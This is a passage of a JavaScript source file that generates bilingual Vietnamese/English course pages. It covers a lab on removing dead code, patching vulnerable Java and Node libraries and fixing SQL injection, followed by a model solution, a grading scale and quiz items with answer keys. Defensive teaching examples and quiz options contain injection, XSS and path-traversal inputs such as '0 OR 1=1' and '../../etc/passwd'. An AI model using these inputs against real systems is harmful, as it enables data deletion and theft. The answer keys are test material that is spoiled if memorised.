[ERROR] Failed to execute goal on project thuvien: Could not resolve dependencies for project com.thuvien:thuvien:war:1.0-SNAPSHOT
[ERROR] dependency: ch.qos.reload4j:reload4j:jar:1.2.27 (compile)
[ERROR] 	Cannot access central (https://repo.maven.apache.org/maven2) in offline mode and the artifact ch.qos.reload4j:reload4j:jar:1.2.27 has not been downloaded from it before.
$ mvn -B -q dependency:resolve && mvn -B -o test | grep 'Tests run:' | tail -1
[INFO] Tests run: 49, Failures: 0, Errors: 0, Skipped: 0
`);
const O64_CJ = out(`
$ mvn -B -o test     # Connector/J 9.7.0, db.properties còn db.driver=com.mysql.jdbc.Driver
Loading class \`com.mysql.jdbc.Driver'. This is deprecated. The new driver class is \`com.mysql.cj.jdbc.Driver'. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.
...
[INFO] Tests run: 49, Failures: 0, Errors: 0, Skipped: 0
$ sed -i 's/^db.driver=com.mysql.jdbc.Driver/db.driver=com.mysql.cj.jdbc.Driver/' src/main/resources/db.properties
$ mvn -B -o test | grep -c "Loading class"
0
`);
const O64_ODC97 = out(`
$ mvn -B org.owasp:dependency-check-maven:13.0.0:check … -DfailBuildOnCVSS=7
[ERROR] One or more dependencies were identified with vulnerabilities that have a CVSS score greater than or equal to '7.0':
[ERROR]
[ERROR] mysql-connector-j-9.7.0.jar (pkg:maven/com.mysql/mysql-connector-j@9.7.0, cpe:2.3:a:oracle:mysql_connector\\/j:9.7.0:*:*:*:*:*:*:*): CVE-2026-60586(7.7), CVE-2026-60623(7.1)
$ python3 tom-tat-odc.py target/dependency-check-report.json | cut -c1-110
mysql-connector-j-9.7.0.jar CVE-2026-60586 7.7 … Supported versions that are affected are 9.7.0-9.7.1. …
mysql-connector-j-9.7.0.jar CVE-2026-60623 7.1 … Supported versions that are affected are 9.7.0-9.7.1. …
mysql-connector-j-9.7.0.jar CVE-2026-60624 6.5 … Supported versions that are affected are 9.7.0-9.7.1. …
mysql-connector-j-9.7.0.jar CVE-2026-61082 6.5 … Supported versions that are affected are 9.7.0-9.7.1. …
$ curl -s https://repo.maven.apache.org/maven2/com/mysql/mysql-connector-j/maven-metadata.xml | grep -oE "<version>[^<]+" | tail -4
<version>9.6.0
<version>9.7.0
<version>26.7.0
<version>26.10.0
`);
const O64_ODC_SAU = out(`
$ mvn -B org.owasp:dependency-check-maven:13.0.0:check … -DfailBuildOnCVSS=7      # Connector/J 26.10.0
[INFO] Analysis Complete (1 seconds)
[INFO] BUILD SUCCESS
[INFO] Total time:  3.121 s
$ python3 tom-tat-odc.py target/dependency-check-report.json | head -1
7 jar duoc quet, 0 CVE
$ mvn -B -o dependency:tree -Dscope=runtime | grep '^\\[INFO\\] [|+\\\\]'
[INFO] +- javax.servlet:jstl:jar:1.2:compile
[INFO] +- com.mysql:mysql-connector-j:jar:26.10.0:compile
[INFO] |  \\- com.google.protobuf:protobuf-java:jar:4.36.1:compile
[INFO] +- ch.qos.reload4j:reload4j:jar:1.2.27:compile
[INFO] \\- commons-lang:commons-lang:jar:2.6:compile
`);
const O64_GOLDEN = out(`
$ docker compose up -d --build web && bash tools/golden.sh /tmp/g6 | tail -1
 299 total
$ for f in books readers report_days_1; do diff -q golden/$f.html /tmp/g6/$f.html >/dev/null && echo "$f: giong het"; done
books: giong het
readers: giong het
report_days_1: giong het
$ # golden master thay ngày bằng <NGAY> ⇒ kiểm riêng ngày hạn trả trên trang so với CSDL (driver mới hay đổi múi giờ)
phieu  trang        CSDL
1      17/11/2026   2026-11-17 22:36:06
2      02/12/2026   2026-12-02 22:36:06
3      13/11/2026   2026-11-13 22:36:06
4      31/10/2026   2026-10-31 22:36:06
`);
const O64_NODE = out(`
$ cd legacy-express && git log --oneline -1 && npm audit --production | tail -2 && npm test 2>&1 | grep '^Tests:'
552c08c chore(6.2): express 4.17.1 -> 4.22.3, moment 2.24.0 -> 2.31.0 (npm audit --production 24 -> 0; 21 test xanh)
found 0 vulnerabilities
 in 71 scanned packages
Tests:       21 passed, 21 total
`);

const L64 = ml((en) => `
<span class="eyebrow">${en ? 'Chapter 6 · Lab' : 'Chương 6 · Lab'}</span>
<h2>${en ? '6.4 — Lab: delete dead code, patch two vulnerable libraries, fix an injection' : '6.4 — Lab: Xoá code chết, vá hai thư viện có lỗ hổng, sửa một lỗi injection'}</h2>
<p class="lead">${en
  ? 'Ticket LIB-110, from the customer’s IT manager: “Our auditor scans every vendor application in January. Please clean up before then: remove what is not used, fix the libraries the scanner flags, and close any SQL injection. No visible change for librarians except where you tell us in advance.” You start from your Chapter 6 lesson state (TV-102, CWE-209, books.jsp, TV-105 done).'
  : 'Ticket LIB-110, từ trưởng phòng CNTT của khách: "Tháng 1 bên kiểm toán sẽ quét mọi ứng dụng của các nhà cung cấp. Nhờ các bạn dọn trước: bỏ thứ không dùng, sửa các thư viện máy quét báo, và đóng mọi lỗi SQL injection. Thủ thư không được thấy thay đổi gì, trừ chỗ các bạn báo trước." Bạn bắt đầu từ trạng thái sau các bài của Chương 6 (đã xong TV-102, CWE-209, books.jsp, TV-105).'}</p>
${moiTruong(en)}

<h3>${en ? 'Rules' : 'Luật chơi'}</h3>
<ol>
<li>${en ? 'Every deletion is backed by two kinds of evidence (lesson 6.1); business features are confirmed by the customer — for this lab, TV-104 confirms <code>xoaSach</code> can go.' : 'Mỗi lần xoá có hai loại bằng chứng (bài 6.1); chức năng nghiệp vụ phải được khách xác nhận — trong lab này, TV-104 xác nhận <code>xoaSach</code> được bỏ.'}</li>
<li>${en ? 'Every security fix starts with a test that is red on the old code, for the right reason.' : 'Mọi bản sửa bảo mật bắt đầu bằng một test đỏ trên code cũ, đỏ đúng lý do.'}</li>
<li>${en ? 'One change per commit; tests green before every commit; golden master identical at the end.' : 'Mỗi commit một thay đổi; test xanh trước mỗi commit; cuối cùng golden master giống hệt.'}</li>
<li>${en ? 'Scanner reports (npm audit, Dependency-Check) and <code>tan-cong.sh</code> output before and after go into the PR description.' : 'Báo cáo máy quét (npm audit, Dependency-Check) và output <code>tan-cong.sh</code> trước/sau đưa vào mô tả PR.'}</li>
</ol>

<h3>${en ? 'Tasks' : 'Nhiệm vụ'}</h3>
<table>
<tr><th>#</th><th>${en ? 'Task' : 'Việc'}</th><th>${en ? 'Done when' : 'Xong khi'}</th></tr>
<tr><td>A1</td><td>${en ? 'Delete <code>BookDAO.findById</code>, <code>Constants.PAGE_SIZE</code>, <code>DATE_FORMAT</code>' : 'Xoá <code>BookDAO.findById</code>, <code>Constants.PAGE_SIZE</code>, <code>DATE_FORMAT</code>'}</td><td>${en ? 'grep + JaCoCo evidence in the commit message; tests green' : 'bằng chứng grep + JaCoCo trong lời commit; test xanh'}</td></tr>
<tr><td>A2</td><td>${en ? 'Remove <code>xoaSach</code> (TV-104)' : 'Gỡ <code>xoaSach</code> (TV-104)'}</td><td>${en ? 'a test proves <code>action=delete</code> now deletes nothing — red before' : 'một test chứng minh <code>action=delete</code> giờ không xoá gì — đỏ trước khi gỡ'}</td></tr>
<tr><td>B1</td><td>${en ? 'Java: log4j 1.2.17 and Connector/J 5.1.49' : 'Java: log4j 1.2.17 và Connector/J 5.1.49'}</td><td>${en ? 'Dependency-Check 0 CVE with <code>-DfailBuildOnCVSS=7</code>; golden master identical' : 'Dependency-Check 0 CVE với <code>-DfailBuildOnCVSS=7</code>; golden master giống hệt'}</td></tr>
<tr><td>B2</td><td>${en ? 'Node: express and moment (if you did not already in 6.2)' : 'Node: express và moment (nếu chưa làm ở 6.2)'}</td><td><code>npm audit --production</code> 0; ${en ? '21 tests green' : '21 test xanh'}</td></tr>
<tr><td>C1</td><td>${en ? 'Remaining injections: book search, add book, add/delete reader' : 'Injection còn lại: tìm sách, thêm sách, thêm/xoá độc giả'}</td><td>${en ? 'attack tests red then green; <code>tan-cong.sh</code> attack 2 returns nothing' : 'test tấn công đỏ rồi xanh; đòn 2 của <code>tan-cong.sh</code> không ra gì'}</td></tr>
<tr><td>C2</td><td>${en ? 'Escape output in <code>readers.jsp</code> and <code>header.jsp</code>' : 'Thoát dữ liệu ở <code>readers.jsp</code> và <code>header.jsp</code>'}</td><td>${en ? 'golden master identical (JSPs are only compiled by Tomcat — unit tests do not see them)' : 'golden master giống hệt (JSP chỉ Tomcat biên dịch — unit test không thấy)'}</td></tr>
</table>

<h3>${en ? 'Hints' : 'Gợi ý'}</h3>
<ul>
<li>${en ? 'Write the five tests of task C1 first. Expect a surprise in the reader-delete one.' : 'Viết năm test của C1 trước. Chờ một bất ngờ ở test xoá độc giả.'}</li>
<li>${en ? 'For B1, look for a drop-in successor of log4j 1.x before considering a migration to SLF4J/Logback.' : 'Với B1, tìm người kế nhiệm thay thẳng của log4j 1.x trước khi nghĩ tới chuyển sang SLF4J/Logback.'}</li>
<li>${en ? 'For Connector/J, read the Maven Central metadata yourself — do not trust the first version number you find.' : 'Với Connector/J, tự đọc metadata trên Maven Central — đừng tin con số phiên bản đầu tiên bạn thấy.'}</li>
<li>${en ? '<code>mvn -o</code> will fail after a <code>pom.xml</code> change until the new artifact is downloaded once.' : '<code>mvn -o</code> sẽ lỗi sau khi đổi <code>pom.xml</code> cho tới khi thư viện mới được tải về một lần.'}</li>
<li>${en ? 'The golden master replaces dates with <code>&lt;NGAY&gt;</code>. A driver upgrade can shift dates by a time zone — check one page against the database by hand.' : 'Golden master thay ngày bằng <code>&lt;NGAY&gt;</code>. Đổi driver có thể làm lệch ngày theo múi giờ — tự so một trang với CSDL.'}</li>
</ul>

${giai(en ? '🔑 Model solution (open after you try)' : '🔑 Lời giải mẫu (mở sau khi đã thử)', `
<p>${en ? 'Patches: <code>lab/loi-giai/ch6/java/*.patch</code> (12) and <code>node/*.patch</code> (1) — <code>git am</code> them onto your <code>ch5</code> branch. Java tests 33 → 49.' : 'Patch: <code>lab/loi-giai/ch6/java/*.patch</code> (12) và <code>node/*.patch</code> (1) — áp bằng <code>git am</code> lên nhánh <code>ch5</code>. Test Java 33 → 49.'}</p>
${O64_LOG}
<h4>C1 — ${en ? 'the attack tests, red on the old code' : 'test tấn công, đỏ trên code cũ'}</h4>
${C64_TEST}
${O64_DO}
<p>${en
  ? 'The surprise: <code>id=0 OR 1=1</code> on the reader form deleted all five readers — and, through <code>ON DELETE CASCADE</code> (found in lesson 2.3), all their loans. Also note the apostrophe test: an injection bug is also a plain functional bug — names like O’Brien or a typo with a quote silently failed for years. The UNION result shows one plaintext and one hashed password: the test DB was half-migrated by the TV-105 tests, which is realistic during a rollout.'
  : 'Bất ngờ: <code>id=0 OR 1=1</code> ở form độc giả xoá sạch cả năm độc giả — và, qua <code>ON DELETE CASCADE</code> (tìm thấy ở bài 2.3), xoá luôn mọi phiếu của họ. Để ý cả test dấu nháy: lỗi injection cũng là một lỗi chức năng bình thường — tên kiểu O’Brien hay một lần gõ nhầm dấu nháy đã âm thầm thất bại suốt nhiều năm. Kết quả UNION cho thấy một mật khẩu thô và một mật khẩu đã băm: CSDL test đang chuyển dở do các test TV-105, đúng như thực tế khi đang triển khai.'}</p>
<p>${en ? 'Fix: <code>PreparedStatement</code> everywhere; search keeps <code>%q%</code> as a parameter (so <code>%</code> and <code>_</code> typed by users are still wildcards, exactly as before); <code>Integer.parseInt</code> on ids, so <code>0 OR 1=1</code> becomes a caught <code>NumberFormatException</code> and nothing is deleted.' : 'Sửa: <code>PreparedStatement</code> ở mọi chỗ; tìm kiếm giữ <code>%q%</code> làm tham số (nên <code>%</code> và <code>_</code> người dùng gõ vẫn là ký tự đại diện, y như trước); <code>Integer.parseInt</code> cho mã, nên <code>0 OR 1=1</code> thành <code>NumberFormatException</code> bị bắt và không xoá gì.'}</p>
<h4>B1 — ${en ? 'libraries' : 'thư viện'}</h4>
${O64_OFFLINE}
<p>${en ? 'reload4j is maintained by Ceki Gülcü, the original author of log4j, as a binary-compatible 1.2.x line with the CVEs fixed: same <code>org.apache.log4j</code> package, zero code change, 49 tests green.' : 'reload4j do Ceki Gülcü — tác giả gốc của log4j — duy trì như một dòng 1.2.x tương thích nhị phân đã sửa các CVE: cùng package <code>org.apache.log4j</code>, không đổi dòng mã nào, 49 test xanh.'}</p>
${O64_CJ}
${O64_ODC97}
<p>${en
  ? 'A good lesson in humility: the first “latest” version chosen (9.7.0, the newest in the 9.x line) was itself vulnerable, and the real latest had moved to calendar versioning (26.x). The scanner caught it because the build fails at CVSS 7. Keep <code>failBuildOnCVSS</code> in the pom (or CI) so the next person gets the same protection.'
  : 'Một bài học khiêm tốn: bản "mới nhất" chọn lần đầu (9.7.0, mới nhất của dòng 9.x) lại có lỗ hổng, còn bản mới nhất thật đã chuyển sang đánh số theo lịch (26.x). Máy quét bắt được vì build dừng ở CVSS 7. Giữ <code>failBuildOnCVSS</code> trong pom (hoặc CI) để người sau được bảo vệ như vậy.'}</p>
${O64_ODC_SAU}
<p>${en ? 'Note the new transitive <code>protobuf-java</code>: the WAR grows by one jar the customer’s auditor will also scan. Mention it in the PR.' : 'Để ý <code>protobuf-java</code> bắc cầu mới: WAR có thêm một jar mà kiểm toán của khách cũng sẽ quét. Ghi điều này trong PR.'}</p>
<h4>${en ? 'Proof that nothing visible changed' : 'Bằng chứng không có gì người dùng thấy bị đổi'}</h4>
${O64_GOLDEN}
${O64_NODE}
<h4>${en ? 'PR description (model)' : 'Mô tả PR (mẫu)'}</h4>
${out(`
LIB-110 — Dọn trước đợt kiểm toán tháng 1

Thay đổi
- Xoá: ExportServlet (TV-103), BookDAO.findById, 2 hằng không dùng, chức năng xoá sách không có nút (TV-104)
- Thư viện: log4j 1.2.17 → reload4j 1.2.27; Connector/J 5.1.49 → mysql-connector-j 26.10.0 (kéo thêm protobuf-java 4.36.1);
  express 4.17.1 → 4.22.3; moment 2.24.0 → 2.31.0
- Sửa SQL injection: mượn/trả (TV-102), đăng nhập (TV-105), tìm sách, thêm sách, thêm/xoá độc giả; thoát HTML ở 3 JSP
- Mật khẩu băm PBKDF2 (TV-105) — CẦN chạy db/migrations/V6_3__mat_khau_bam.sql TRƯỚC khi triển khai, rồi tools/BamMatKhauCu

Người dùng sẽ thấy
- Mật khẩu phân biệt chữ hoa/thường và không bỏ qua dấu cách cuối (trước đây "ADMIN123" vẫn vào được)
- Mã độc giả/mã phiếu không phải số: "Mã … không hợp lệ" thay cho dòng lỗi SQL
- Lỗi hệ thống: "Loi he thong … (ma loi xxxxxxxx)" thay cho thông báo kỹ thuật

Bằng chứng
- Test Java 33 → 49 (test tấn công đỏ trước khi sửa), Node 21/21; golden master 3 trang giống hệt
- Dependency-Check: 8 CVE → 0 (failBuildOnCVSS=7); npm audit --production: 24 → 0
- tan-cong.sh trước/sau: đòn 1–7 bị chặn (đính kèm)

Còn lại (đã biết, có ticket)
- Cookie "ghi nhớ" giả được (TV-96), dò tên đăng nhập qua thời gian phản hồi (TV-106), race ghi phiếu bên API (TV-98)
- 47 lỗ hổng trong devDependencies (Jest 26) — đi cùng nâng Node, Chương 7
`)}
`)}

<h3>${en ? 'Grading (10 points)' : 'Thang chấm (10 điểm)'}</h3>
<table>
<tr><th>${en ? 'Criterion' : 'Tiêu chí'}</th><th>${en ? 'Points' : 'Điểm'}</th></tr>
<tr><td>${en ? 'Each deletion has two kinds of evidence in its commit message' : 'Mỗi lần xoá có hai loại bằng chứng trong lời commit'}</td><td>2</td></tr>
<tr><td>${en ? 'Every security fix has a test shown red on the old code' : 'Mọi bản sửa bảo mật có test đã đỏ trên code cũ'}</td><td>2</td></tr>
<tr><td>${en ? 'Scanners at 0 (production scope), with the reports attached' : 'Máy quét về 0 (phạm vi production), có đính kèm báo cáo'}</td><td>2</td></tr>
<tr><td>${en ? 'Golden master identical + one manual date check' : 'Golden master giống hệt + một lần tự kiểm ngày'}</td><td>1</td></tr>
<tr><td>${en ? 'One change per commit, all green' : 'Mỗi commit một thay đổi, commit nào cũng xanh'}</td><td>1</td></tr>
<tr><td>${en ? 'PR lists user-visible changes, deployment order and remaining issues' : 'PR ghi thay đổi người dùng thấy, thứ tự triển khai và vấn đề còn lại'}</td><td>2</td></tr>
</table>
<p><strong>${en ? 'Extra challenge:' : 'Thử thách thêm:'}</strong> ${en
  ? '(1) TV-106 — remove the timing difference between “unknown user” (3 ms) and “wrong password” (0.7 s) by verifying against a dummy hash when the user does not exist; write a test that measures both. (2) Design (do not implement yet) the fix for TV-96: a random remember-me token stored hashed in a table, rotated on use, with <code>HttpOnly</code> and <code>Secure</code>. (3) Add <code>dependency-check-maven</code> to the pom with <code>failBuildOnCVSS</code> so <code>mvn verify</code> fails on a new CVE.'
  : '(1) TV-106 — xoá chênh lệch thời gian giữa "không có người dùng" (3 ms) và "sai mật khẩu" (0,7 s) bằng cách so với một bản băm giả khi không tìm thấy người dùng; viết test đo cả hai. (2) Thiết kế (chưa cài) bản sửa TV-96: token ghi nhớ ngẫu nhiên, lưu dạng băm trong bảng, đổi mới mỗi lần dùng, có <code>HttpOnly</code> và <code>Secure</code>. (3) Thêm <code>dependency-check-maven</code> vào pom với <code>failBuildOnCVSS</code> để <code>mvn verify</code> dừng khi có CVE mới.'}</p>

<h3>🎤 ${en ? 'What the interviewer will ask' : 'Phỏng vấn viên sẽ hỏi'}</h3>
<ol>
<li><strong>${en ? '“Tell me about a security fix you made in legacy code.”' : '"Kể về một lần em sửa bảo mật trong code cũ."'}</strong><br>${en
  ? 'Use this lab with numbers: five injection points, attack tests red first (one delete wiped all readers through a cascade), PreparedStatement fixes, 33 → 49 tests, scanners 8 → 0 and 24 → 0, golden master identical, and what I deliberately left with tickets.'
  : 'Dùng chính lab này, có số: năm chỗ injection, test tấn công đỏ trước (một lệnh xoá đã quét sạch độc giả qua cascade), sửa bằng PreparedStatement, 33 → 49 test, máy quét 8 → 0 và 24 → 0, golden master giống hệt, và những gì em cố ý để lại kèm ticket.'}</li>
<li><strong>${en ? '“How do you upgrade a library in a project with no CI and a customer who approves every jar?”' : '"Nâng thư viện thế nào khi dự án không có CI và khách duyệt từng jar?"'}</strong><br>${en
  ? 'Smallest step that closes the CVEs (a drop-in successor if one exists), tests + golden master locally, list new transitive jars, and put the scanner report before/after in the PR so the customer can approve on evidence.'
  : 'Bước nhỏ nhất đóng được CVE (người kế nhiệm thay thẳng nếu có), test + golden master trên máy, liệt kê jar bắc cầu mới, và đưa báo cáo máy quét trước/sau vào PR để khách duyệt dựa trên bằng chứng.'}</li>
<li><strong>${en ? '“The latest version is also flagged by the scanner. Now what?”' : '"Bản mới nhất cũng bị máy quét báo. Giờ sao?"'}</strong><br>${en
  ? 'Read the advisory: which versions are affected, is there a newer line (here 26.x), is the vulnerable path reachable. If no fix exists, document a time-limited suppression with the reasoning and an owner, never a silent one.'
  : 'Đọc khuyến cáo: bản nào bị ảnh hưởng, có dòng mới hơn không (ở đây 26.x), đường lỗi có chạm tới được không. Nếu chưa có bản sửa, ghi một suppression có thời hạn kèm lý do và người chịu trách nhiệm, không bao giờ âm thầm bỏ qua.'}</li>
</ol>

<h3>💼 ${en ? 'OJT situation' : 'Tình huống OJT'}</h3>
<p>${en
  ? 'Pre-audit clean-ups like LIB-110 are common in outsourcing in the last quarter of the year, when customers prepare for ISO 27001 or internal audits. They are a good intern task because the scope is clear and the evidence is mechanical — and a dangerous one because “upgrade everything” is tempting. The teams that keep the customer are the ones whose PR says exactly what users will notice and in which order to deploy.'
  : 'Những đợt dọn trước kiểm toán như LIB-110 rất hay gặp ở outsourcing vào quý cuối năm, khi khách chuẩn bị ISO 27001 hay kiểm toán nội bộ. Đó là việc tốt cho thực tập sinh vì phạm vi rõ và bằng chứng mang tính cơ học — và cũng nguy hiểm vì "nâng hết lên" rất hấp dẫn. Nhóm giữ được khách là nhóm có PR ghi chính xác người dùng sẽ thấy gì và triển khai theo thứ tự nào.'}</p>
<p>${en
  ? '🛠 <strong>Capstone milestone:</strong> the Chapter 9 backlog contains one dead-code ticket, one dependency ticket and one security ticket. This lab is their rehearsal.'
  : '🛠 <strong>Mốc dự án cuối khoá:</strong> backlog Chương 9 có một ticket code chết, một ticket thư viện và một ticket bảo mật. Lab này là buổi tập trước.'}</p>

<h3>🗂 ${en ? 'Key terms' : 'Thuật ngữ trong bài'}</h3>
${thuatNgu(en, [
  ['Drop-in replacement', 'thay thẳng', 'Thư viện khác tên nhưng cùng API/package, đổi trong pom là xong.', 'A differently named library with the same API/package — a pom change only.'],
  ['failBuildOnCVSS', 'dừng build theo điểm', 'Cấu hình Dependency-Check làm build thất bại khi có CVE từ mức điểm này.', 'Dependency-Check setting that fails the build at or above a score.'],
  ['Suppression', 'bỏ qua có ghi chép', 'Ghi nhận một cảnh báo không áp dụng, kèm lý do và thời hạn.', 'Recording that a finding does not apply, with reason and expiry.'],
  ['ON DELETE CASCADE', 'xoá dây chuyền', 'Xoá dòng cha thì xoá luôn dòng con — biến một injection thành mất dữ liệu diện rộng.', 'Deleting a parent deletes its children — turning one injection into wide data loss.'],
])}

<h3>📌 ${en ? 'Summary' : 'Tóm tắt'}</h3>
<ul>
<li>${en ? 'Delete with evidence, patch with scanners, fix with tests that were red first.' : 'Xoá có bằng chứng, vá theo máy quét, sửa bằng test từng đỏ trước.'}</li>
<li>${en ? '“Latest” is a claim to verify; keep the scanner in the build.' : '"Mới nhất" là điều cần kiểm; giữ máy quét trong build.'}</li>
<li>${en ? 'Next chapter: upgrading the platform itself — Java 17, Tomcat 10 and jakarta, Node 20.' : 'Chương sau: nâng chính nền tảng — Java 17, Tomcat 10 và jakarta, Node 20.'}</li>
</ul>
`);

/* ═══════════════════ 6.5 — Quiz ═══════════════════ */
/** Dời đáp án đúng sang vị trí khác để các câu không dồn về cùng một chữ cái. */
const dat = (q, viTri) => { const o = [...q.options]; const [d] = o.splice(q.correctIndex, 1); o.splice(viTri, 0, d); return { ...q, options: o, correctIndex: viTri }; };

const QUIZ6_GOC = [
  Q('grep finds ReportServlet only in its own .java file, not in web.xml. What is the right conclusion?|||grep chỉ thấy ReportServlet trong tệp .java của nó, không có trong web.xml. Kết luận đúng là gì?', [
    'Check other entry points first — here it is mapped by @WebServlet("/report") and is the overdue report on the menu|||Kiểm các điểm vào khác trước — ở đây nó được gắn bằng @WebServlet("/report") và chính là báo cáo quá hạn trên menu',
    'It is dead; delete it|||Nó chết rồi; xoá đi',
    'It is dead only if JaCoCo also says 0%|||Nó chỉ chết nếu JaCoCo cũng báo 0%',
    'web.xml is outdated; add a mapping|||web.xml đã cũ; thêm khối mapping vào',
  ], 0, 'EN: Java web entry points live in web.xml, annotations, JSP forms, schedulers and reflection. Search all of them.|||VI: Điểm vào của web Java nằm ở web.xml, chú thích, form JSP, bộ lập lịch và phản chiếu. Tìm ở tất cả.'),
  Q('mvn dependency:analyze reports jstl and mysql-connector-java as “Unused declared”. Why is that wrong here?|||mvn dependency:analyze báo jstl và mysql-connector-java "Unused declared". Vì sao ở đây là sai?', [
    'The plugin is too old|||Plugin quá cũ',
    'Bytecode analysis cannot see the JSTL tag used in report.jsp or the driver loaded by name through Class.forName|||Phân tích bytecode không thấy thẻ JSTL dùng trong report.jsp hay driver nạp theo tên qua Class.forName',
    'They are test dependencies|||Chúng là thư viện cho test',
    'Maven was run offline|||Maven chạy ở chế độ offline',
  ], 1, 'EN: “Unused” from a tool is a candidate. Remove, then run the whole application, not only unit tests.|||VI: "Không dùng" do công cụ báo chỉ là ứng viên. Gỡ thử rồi chạy cả ứng dụng, không chỉ unit test.'),
  Q('A JaCoCo agent on Tomcat for one simulated day shows LoaiDocGia lecturer/guest methods at 0%. What should you do?|||Agent JaCoCo gắn vào Tomcat trong một ngày giả lập cho thấy hàm của giảng viên/khách ở LoaiDocGia 0%. Nên làm gì?', [
    'Delete the lecturer and guest rules|||Xoá luật giảng viên và khách',
    'Mark them @Deprecated|||Đánh dấu @Deprecated',
    'Nothing — the window only borrowed with a student; runtime evidence needs a period covering all users and month/year-end jobs|||Không làm gì — cửa sổ đo chỉ mượn bằng sinh viên; bằng chứng lúc chạy cần một khoảng phủ mọi loại người dùng và việc cuối tháng/cuối năm',
    'Increase the JaCoCo sampling rate|||Tăng tần suất lấy mẫu của JaCoCo',
  ], 2, 'EN: Short windows produce false “dead” results. Combine with static evidence and ask the business owner.|||VI: Cửa sổ ngắn sinh ra kết quả "chết" giả. Kết hợp bằng chứng tĩnh và hỏi chủ nghiệp vụ.'),
  Q('Why is BookServlet.xoaSach more dangerous than ordinary dead code?|||Vì sao BookServlet.xoaSach nguy hiểm hơn code chết thông thường?', [
    'It makes the WAR larger|||Nó làm WAR nặng hơn',
    'It slows down every request|||Nó làm mọi request chậm đi',
    'PMD reports it|||PMD báo nó',
    'No UI calls it, but any logged-in user can POST action=delete — and it concatenates SQL, so one request deleted 3 of 7 books|||Không giao diện nào gọi, nhưng ai đăng nhập cũng POST được action=delete — lại nối chuỗi SQL, nên một request đã xoá 3 trong 7 cuốn',
  ], 3, 'EN: Dead for users, alive for attackers. Unused endpoints are attack surface.|||VI: Chết với người dùng, sống với kẻ tấn công. Endpoint không dùng vẫn là bề mặt tấn công.'),
  Q('npm audit --production lists qs CVE-2022-24999 (HIGH). The published PoC returns 200 in 4 ms on our API. Best decision?|||npm audit --production báo qs CVE-2022-24999 (HIGH). Chuỗi PoC công bố trả 200 trong 4 ms trên API của ta. Quyết định hợp lý nhất?', [
    'Ignore it permanently — it is not exploitable|||Bỏ qua mãi mãi — không khai thác được',
    'Upgrade within Express 4.x in a normal PR; record the reachability test as evidence of priority|||Nâng trong Express 4.x bằng một PR bình thường; ghi lại phép thử khả năng chạm tới làm bằng chứng cho mức ưu tiên',
    'Hotfix production tonight|||Vá khẩn production ngay tối nay',
    'Run npm audit fix --force|||Chạy npm audit fix --force',
  ], 1, 'EN: Measured, not exploitable today — but cheap to fix and reachable the day someone loops over req.query.|||VI: Đã đo, hôm nay không khai thác được — nhưng sửa rẻ và sẽ chạm tới được ngay ngày ai đó lặp trên req.query.'),
  Q('npm 6 says “22 vulnerabilities require semver-major updates”, yet express 4.22.3 fixes most of them. Why the message?|||npm 6 báo "22 lỗ hổng cần nâng bản major", trong khi express 4.22.3 sửa được phần lớn. Vì sao có thông báo đó?', [
    'express 4.22.3 is not on npm|||express 4.22.3 không có trên npm',
    'npm 6 cannot read lockfile v1|||npm 6 không đọc được lockfile v1',
    'package.json pins "express": "4.17.1" exactly, so no newer version satisfies the declared range|||package.json ghim đúng "express": "4.17.1", nên không bản mới nào thoả khoảng đã khai báo',
    'Node 14 is end of life|||Node 14 đã hết vòng đời',
  ], 2, 'EN: Exact pins make audit fix nearly useless; upgrade explicitly with --save-exact and test.|||VI: Ghim cứng làm audit fix gần như vô dụng; nâng tường minh với --save-exact rồi test.'),
  Q('The Versions plugin lists nothing for log4j:log4j 1.2.17. What does that mean?|||Versions plugin không liệt kê gì cho log4j:log4j 1.2.17. Điều đó nghĩa là gì?', [
    '1.2.17 is the last version ever released under that name — the line is end of life, and successors have different coordinates|||1.2.17 là bản cuối cùng từng ra dưới tên đó — dòng này đã hết vòng đời, người kế nhiệm có tọa độ khác',
    'log4j 1.2.17 has no known vulnerabilities|||log4j 1.2.17 không có lỗ hổng nào đã biết',
    'The plugin skips logging libraries|||Plugin bỏ qua thư viện ghi log',
    'Maven Central is unreachable|||Không kết nối được Maven Central',
  ], 0, 'EN: “Up to date” can mean “dead”. Dependency-Check found six CVEs in it.|||VI: "Mới nhất" có thể nghĩa là "đã chết". Dependency-Check tìm thấy sáu CVE trong nó.'),
  Q('A manager asks “are we affected by Log4Shell?” The project uses log4j 1.2.17. Best answer?|||Quản lý hỏi "mình có dính Log4Shell không?" Dự án dùng log4j 1.2.17. Trả lời tốt nhất?', [
    'Yes — every log4j version is affected|||Có — mọi bản log4j đều dính',
    'No, log4j is safe here|||Không, log4j ở đây an toàn',
    'We cannot know without a penetration test|||Không biết được nếu chưa kiểm thử xâm nhập',
    'Not by CVE-2021-44228 (log4j-core 2.0-beta9 – 2.14.1), but 1.2.17 is EOL with its own CVEs, so we are replacing it|||Không dính CVE-2021-44228 (log4j-core 2.0-beta9 – 2.14.1), nhưng 1.2.17 đã hết vòng đời và có CVE riêng, nên đang thay nó',
  ], 3, 'EN: Answer with artifact and version ranges, not with the word “log4j”.|||VI: Trả lời bằng tên thư viện và dải phiên bản, đừng chỉ bằng chữ "log4j".'),
  Q('Which input still exploits the old PhieuMuonDAO even if every single quote is stripped from user input?|||Đầu vào nào vẫn khai thác được PhieuMuonDAO cũ dù mọi dấu nháy đơn đã bị lọc bỏ?', [
    '\' OR \'1\'=\'1|||\' OR \'1\'=\'1',
    '2 AND SLEEP(2)|||2 AND SLEEP(2)',
    '<script>alert(1)</script>|||<script>alert(1)</script>',
    '../../etc/passwd|||../../etc/passwd',
  ], 1, 'EN: The id is concatenated without quotes, so numeric-context injection needs none. Parameters, not filters.|||VI: id được nối không có dấu nháy, nên injection ở ngữ cảnh số không cần dấu nháy nào. Dùng tham số, không dùng bộ lọc.'),
  Q('After the TV-102 fix the test readerIdKhongPhaiSo fails: it expected “Loi: Unknown column \'abc\'…”. What is correct?|||Sau bản sửa TV-102, test readerIdKhongPhaiSo đỏ: nó chờ "Loi: Unknown column \'abc\'…". Làm thế nào là đúng?', [
    'Revert the fix — characterization tests must never change|||Hoàn tác bản sửa — characterization test không bao giờ được đổi',
    'Delete the test|||Xoá test',
    'Flip the expectation to “Mã độc giả không hợp lệ” deliberately and say so in the commit: the old message was the vulnerability|||Lật kỳ vọng thành "Mã độc giả không hợp lệ" một cách có chủ đích và ghi rõ trong commit: thông báo cũ chính là lỗ hổng',
    'Catch the exception in the test|||Bắt ngoại lệ trong test',
